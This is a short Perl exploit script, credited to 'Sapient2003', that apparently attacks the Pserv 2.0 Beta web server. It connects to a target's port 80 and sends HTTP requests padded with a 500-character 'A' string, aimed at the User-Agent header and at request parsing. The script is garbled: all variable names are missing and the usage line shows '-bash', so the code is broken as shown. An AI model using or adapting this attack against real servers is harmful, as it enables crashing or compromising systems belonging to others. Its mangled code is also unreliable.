#!/usr/bin/perl -w

use IO::Socket;

 = "Pserv 2.0 Beta 1, 2, 3, 5";

unless (@ARGV == 1) {
print "\n By Sapient2003\n";
die "usage: -bash <host to exploit>\n";
}
print "\n By Sapient2003\n";

 = "A" x 500;

 = "GET / HTTP/1.0\nUser-Agent: \n\n";
 = "GET / HTTP/1.0\n\n";
 = "GET / HTTP/1.\n\n";

 = IO::Socket::INET->new(
    PeerAddr => [0],
    PeerPort => 80,
    Proto    => "tcp",
) or die "Can't find host [0]\n";
print  ;
print "Attempted to exploit User-Agent HTTP Header\n";
close();

 = IO::Socket::INET->new(
    PeerAddr => [0],
    PeerPort => 80,
    Proto    => "tcp",
) or die "Can't find host [0]\n";
print  ;
print "Attempted to exploit HTTP Request Parsing\n";
close();
